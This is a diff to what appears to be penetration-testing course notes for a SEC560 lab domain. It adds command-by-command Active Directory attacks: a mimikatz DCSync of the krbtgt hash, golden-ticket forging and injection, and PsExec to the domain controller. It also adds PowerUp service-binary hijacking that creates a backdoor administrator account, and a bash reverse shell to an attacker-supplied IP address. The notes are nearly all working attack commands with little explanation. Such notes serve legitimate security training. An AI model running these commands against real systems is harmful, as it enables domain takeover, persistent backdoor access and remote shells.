@@ -219,7 +219,7 @@ Play Streams
 
 # Chapter 5
 
-#### Kerberoasting
+#### Kerberoasting and Other Krbtgt attacks
 
 ```
 cscript.exe GetUserSPNs.vbs
@@ -241,6 +241,30 @@ Crack ticket with tgsrepcrack.py from TIM Medin `https://github.com/nidem/kerber
 ```
 python tgsrepcrack.py example.dict C:\Users\sec560\Desktop\1-40a10000-john.doe@svcsqlserver~dc01.sec560.local~1433-SEC560.LOCAL.kirbi
 ```
+##### Golden Ticket
+```
+mimikatz.exe
+
+mimikatz # lsadump::dcsync /user:krbtgt
+
+mimikatz # kerberos::golden /rc4:5525e655c06299c7e4179e2cc5621fb3 /user:Administrator /domain:sec560.local /sid:S-1-5-21-721047592-4068106649-2889670365
+
+mimikatz # kerberos::ptt C:\Users\sec560\Desktop\ticket.kirbi
+```
+If injected correctly, the output should show `* File: 'C:\Users\sec560\Desktop\ticket.kirbi': OK`
+```
+mimikatz # exit
+C:\Tools\Mimikatz\x64\> klist
+
+Cached Ticket: (1)
+...snip...
+```
+```
+C:\Tools\SysinternalsSuite> PsExec64.exe -accepteula \\dc01 cmd.exe
+```
+This will use the Loaded ticket
+
+
 
 #### Responder
 
@@ -257,3 +281,34 @@ john --format=netntlmv2 /opt/responder/logs/SMBv2-NTLMv2-SSP-YOUR_WINDOWS_IP_ADD
 ```
 
 passwords saved in `~/.john/john.pot`
+
+#### Priv Esc
+
+```
+beRoot.exe
+```
+```
+PS C:\Tools> Import-Module .\PowerUp.ps1
+PS C:\Tools> Invoke-Allchecks
+```
+
+```
+PS C:\users\notadmin> Write-ServiceBinary -ServiceName 'Video Stream' -ServicePath 'C:\Program Files\VideoStream\1337.exe'
+```
+Reboot service or computer and it will add user `john`  with password `Password123!`
+or any other command if command were specified using  `-UserName backdoor2 -Password password123`
+
+#### Web
+
+Using Tcpdump to test ping injection
+
+```
+sudo tcpdump -n host 10.10.10.50 and icmp
+```
+
+New version of dev/tcp not on pentest monkey
+```
+/bin/bash -i > /dev/tcp/YOUR_LINUX_IP_ADDRESS/9999 0<&1 2>&1
+```
+
+
